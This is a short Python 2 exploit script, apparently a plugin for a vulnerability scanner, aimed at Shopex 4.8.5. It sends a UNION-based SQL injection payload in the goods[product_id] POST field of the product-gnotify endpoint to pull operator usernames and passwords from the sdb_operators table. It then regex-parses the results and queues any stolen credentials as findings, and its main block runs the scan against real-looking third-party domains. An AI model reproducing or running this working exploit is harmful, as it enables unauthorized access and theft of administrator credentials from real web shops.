#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#Author:MXi4oyu
#Email:798033502@qq.com
#Shopex 4.8.5 SQL Injection Exp
#转载请保留版权，谢谢合作

import httplib2
from urllib import urlencode
import re
import sys
import threading

from class_Queue import url_exp

class bc_shopex_4_8_5:
    def assign(self,service, arg=None):
        if service == 'Shopex':
            return True, arg

    def scan(self,arg):
        try:
            url0, url1 = arg
            url=url1+'/?product-gnotify'
            #定义要提交的数据
            html='1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators limit 0,1'
            data={"goods[goods_id]":'3',"goods[product_id]":html}
            h = httplib2.Http('.cache')
            response,content = h.request(url, 'POST', urlencode(data),
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
            gre=re.compile(r'\$\^(.+)?\^\$')
            s=content
            lpwd=gre.findall(s)
            if len(lpwd)==1:
                EXP_list=[1,url0,url1,"CN_bc_shopex_4_8_5",url,lpwd[0],""]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                #print EXP_list
                url_exp.put(EXP_list,0.5)   #插入队列

            else:
                pass
            return 1
        except Exception,e:
        #print e
            return 0




###############################################
# #www.haamei.com
if __name__=='__main__':
    class_www=bc_shopex_4_8_5()
    class_www.scan(class_www.assign('Shopex', ("http://www.baidu.com","http://www.ranpeng.com.cn"))[1])
